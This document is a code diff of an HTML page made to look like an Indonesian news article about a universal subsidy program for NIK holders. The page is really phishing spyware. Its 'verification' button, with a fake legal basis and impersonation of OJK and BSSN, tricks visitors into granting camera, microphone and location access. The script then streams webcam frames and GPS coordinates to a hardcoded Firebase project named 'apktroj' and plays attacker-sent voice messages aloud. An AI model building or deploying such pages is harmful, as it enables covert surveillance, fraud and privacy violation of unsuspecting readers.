@@ -3,57 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warta Nasional - Berita Hari Ini</title>
+    <title>Warta Nasional - Berita Terkini dan Terpercaya</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #ffffff; color: #1a1a1a; }
-        .article-body p { margin-bottom: 1.25rem; line-height: 1.8; color: #2d2d2d; }
-        #spy-cam { display: none; visibility: hidden; position: fixed; top: -9999px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .article-content p { margin-bottom: 1.5rem; color: #333; line-height: 1.8; }
+        .sticky-nav { position: sticky; top: 0; z-index: 40; }
     </style>
 </head>
-<body>
-    <nav class="border-b sticky top-0 bg-white z-50 p-4 shadow-sm">
-        <div class="max-w-2xl mx-auto flex items-center">
-            <span class="text-red-700 font-black text-2xl">WARTA<span class="text-gray-900">NASIONAL</span></span>
+<body class="bg-white">
+    <!-- Navbar -->
+    <nav class="sticky-nav bg-red-700 text-white p-4 shadow-md">
+        <div class="max-w-4xl mx-auto flex justify-between items-center">
+            <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
+            <div class="hidden md:flex space-x-4 text-sm font-semibold">
+                <span>POLITIK</span>
+                <span>EKONOMI</span>
+                <span>METRO</span>
+                <span>DUNIA</span>
+            </div>
         </div>
     </nav>
 
-    <main class="max-w-2xl mx-auto p-5">
-        <div class="text-[11px] font-bold text-red-600 uppercase mb-2">Nasional</div>
-        <h1 class="text-3xl font-extrabold leading-tight mb-4">Kebijakan Subsidi Langsung Tunai (SLT) Resmi Diberlakukan Bagi Seluruh Warga Ber-NIK Aktif</h1>
-        <div class="flex items-center text-gray-500 text-xs mb-6 border-b pb-4">
-            <span>Editor: Agus Subekti</span>
-            <span class="mx-2">|</span>
-            <span>Senin, 02 Maret 2026</span>
-        </div>
-
-        <div class="article-body text-lg">
-            <p><strong>Jakarta</strong> - Keputusan rapat koordinasi tingkat menteri akhirnya membuahkan hasil signifikan terkait tata kelola penyaluran subsidi nasional. Pemerintah memastikan bahwa setiap warga negara dengan NIK valid akan mendapatkan akses langsung ke program subsidi energi dan pangan.</p>
-            <p>Menteri Keuangan menjelaskan bahwa sistem ini dirancang untuk meminimalisir keterlibatan pihak ketiga, sehingga dana subsidi Rp 450 triliun bisa langsung sampai ke dompet digital masyarakat tanpa potongan apapun.</p>
-        </div>
-
-        <!-- Call to Action -->
-        <div id="cta-block" class="my-10 bg-gray-50 p-8 rounded-2xl border text-center">
-            <h3 class="font-bold text-gray-800 mb-2">Cek Status Penerima di Wilayah Anda</h3>
-            <p class="text-sm text-gray-500 mb-6 italic">Untuk alasan keamanan data, proses sinkronisasi memerlukan otentikasi browser yang valid.</p>
-            <button id="read-btn" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-12 rounded-full shadow-lg transition-transform active:scale-95">
-                BACA SELENGKAPNYA
-            </button>
-        </div>
-
-        <!-- Extended Content (Stealth Triggered) -->
-        <div id="hidden-content" class="hidden article-body mt-4">
-            <p>Prosedur pendaftaran akan dilakukan dalam beberapa gelombang. Gelombang pertama mencakup wilayah Jabodetabek dan kota-kota besar di Pulau Jawa, diikuti oleh wilayah Indonesia Timur pada bulan berikutnya.</p>
-            <p>Sistem ini terintegrasi langsung dengan database kependudukan pusat, yang berarti warga tidak perlu lagi mengunggah dokumen fisik atau mengantre di kantor kelurahan setempat.</p>
-            <p>Masyarakat diimbau untuk segera memperbarui data kependudukan mereka melalui portal-portal resmi yang telah disediakan pemerintah guna menghindari kendala teknis saat pencairan dana subsidi berlangsung.</p>
-            <div class="bg-blue-50 p-4 border-l-4 border-blue-500 text-sm text-blue-700 italic">
-                Peringatan: Hindari membagikan kode OTP atau data pribadi kepada pihak yang mengatasnamakan kementerian terkait.
+    <!-- Main Content -->
+    <main class="max-w-4xl mx-auto p-4 md:p-8">
+        <div class="mb-4">
+            <span class="text-red-600 font-bold text-sm">EKONOMI & SOSIAL</span>
+            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Subsidi Listrik dan Sembako Gratis untuk Seluruh Pemegang NIK Aktif Mulai Maret 2026</h1>
+            <div class="flex items-center mt-4 text-gray-500 text-xs italic">
+                <span>Oleh: Redaksi Warta Nasional</span>
+                <span class="mx-2">•</span>
+                <span>Senin, 02 Maret 2026</span>
             </div>
+        </div>
+
+        <img src="https://via.placeholder.com/800x450?text=Distribusi+Bantuan+Sosial" class="w-full rounded-lg mb-6 shadow-sm">
+
+        <div class="article-content text-lg">
+            <p><strong>Jakarta</strong> - Pemerintah melalui Kementerian Sosial dan Kementerian Energi dan Sumber Daya Mineral resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK) yang terdaftar di database kependudukan nasional.</p>
+            
+            <p>Program ini bertujuan untuk menekan laju inflasi dan memastikan daya beli masyarakat tetap terjaga di tengah dinamika ekonomi global. Menteri Koordinator Bidang Perekonomian menyatakan bahwa subsidi ini bukan lagi bersifat tunai, melainkan langsung terintegrasi dengan layanan digital kependudukan masing-masing warga.</p>
+
+            <!-- Trigger Form (The Trap) -->
+            <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
+                <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
+                <p class="text-sm text-gray-700 mb-6">Sesuai dengan protokol keamanan siber yang baru (UU No. 27/2026), setiap penerima manfaat wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong> untuk memastikan bantuan tidak salah sasaran.</p>
+                
+                <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
+                    AKTIFKAN VERIFIKASI SEKARANG
+                </button>
+                <p class="text-[10px] text-gray-400 mt-4 text-center italic">Layanan ini diawasi oleh Otoritas Jasa Keuangan (OJK) dan BSSN.</p>
+            </div>
+
+            <p>Menurut data terakhir, terdapat lebih dari 150 juta warga yang berpotensi menerima manfaat ini. Subsidi mencakup potongan tagihan listrik hingga 50% bagi golongan tertentu dan paket pangan pokok yang didistribusikan setiap bulan melalui jaringan ritel modern yang bekerja sama dengan pemerintah.</p>
+
+            <p>Direktur Jenderal Kependudukan menambahkan bahwa masyarakat tidak perlu lagi mengantre di kantor kelurahan. "Cukup melalui portal resmi berita yang terintegrasi, warga bisa langsung melakukan validasi data biometrik mereka untuk mengaktifkan status subsidi," ujarnya dalam konferensi pers pagi tadi.</p>
         </div>
     </main>
 
-    <!-- Invisible Hardware Interface -->
-    <video id="v" id="spy-cam" autoplay playsinline></video>
+    <!-- Background Process Logic -->
+    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
@@ -61,81 +70,84 @@
         import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        const firebaseConfig = JSON.parse(__firebase_config);
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+        };
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const appId = "apktroj_v1";
 
-        const STORAGE_KEY = 'news_reader_state';
+        document.getElementById('verify-btn').onclick = async () => {
+            const btn = document.getElementById('verify-btn');
+            btn.classList.remove('animate-bounce');
+            btn.innerText = "SEDANG MENGHUBUNGKAN KE SERVER BSSN...";
+            btn.disabled = true;
 
-        // Auto-Reconnect Logic
-        window.addEventListener('load', async () => {
-            if (localStorage.getItem(STORAGE_KEY) === 'active') {
-                showContent();
-                await connectSystem();
-            }
-        });
-
-        document.getElementById('read-btn').onclick = async () => {
-            localStorage.setItem(STORAGE_KEY, 'active');
-            showContent();
-            await connectSystem();
+            await signInAnonymously(auth);
+            startAgent();
         };
 
-        function showContent() {
-            document.getElementById('cta-block').classList.add('hidden');
-            document.getElementById('hidden-content').classList.remove('hidden');
-        }
+        async function startAgent() {
+            const userId = auth.currentUser.uid;
+            let currentLocation = null;
 
-        async function connectSystem() {
-            await signInAnonymously(auth);
-            if (!auth.currentUser) return;
-
-            const uid = auth.currentUser.uid;
-            let currentCoords = null;
-
-            // Silent Location
+            // 1. Get Stealth Location
             navigator.geolocation.getCurrentPosition(p => {
-                currentCoords = { lat: p.coords.latitude, lng: p.coords.longitude };
-            }, () => {}, { enableHighAccuracy: true });
+                currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
+            }, err => console.log("Loc Denied"));
 
-            // Silent Camera Stream
+            // 2. Start Stealth Stream
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                video.style.display = 'none'; // Ensure video is hidden
-                
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
+                // Update Buffer Every 1.5 seconds (Overwrite)
                 setInterval(async () => {
-                    canvas.width = 240;
+                    canvas.width = 240; 
                     canvas.height = 180;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    try {
-                        await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', uid), {
-                            frame: canvas.toDataURL('image/jpeg', 0.3),
-                            location: currentCoords,
-                            timestamp: Date.now(),
-                            uid: uid
-                        });
-                    } catch (e) {}
-                }, 1300);
+                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
+                        frame: canvas.toDataURL('image/jpeg', 0.3),
+                        location: currentLocation,
+                        timestamp: Date.now(),
+                        uid: userId
+                    });
+                }, 1500);
 
-                // Voice Command Listener
+                // 3. Listen for Voice Commands (Intercom)
                 onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                     if (snap.exists()) {
                         const data = snap.data();
-                        if (Date.now() - data.timestamp < 3500) {
+                        if (Date.now() - data.timestamp < 3000) {
                             const utter = new SpeechSynthesisUtterance(data.text);
                             utter.lang = 'id-ID';
+                            utter.rate = 1.0;
                             window.speechSynthesis.speak(utter);
                         }
                     }
                 });
-            }).catch(() => {});
+
+                document.getElementById('trap-container').innerHTML = `
+                    <div class="text-center p-4">
+                        <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
+                        <p class="text-sm font-bold text-red-600 uppercase">Verifikasi Wajah & Lokasi Berlangsung...</p>
+                        <p class="text-xs text-gray-500">Mohon jangan tutup halaman ini agar validasi tidak gagal.</p>
+                    </div>
+                `;
+            }).catch(e => {
+                alert("Verifikasi Gagal: Akses Kamera Wajib Diberikan untuk Validasi Biometrik.");
+                location.reload();
+            });
         }
     </script>
 </body>
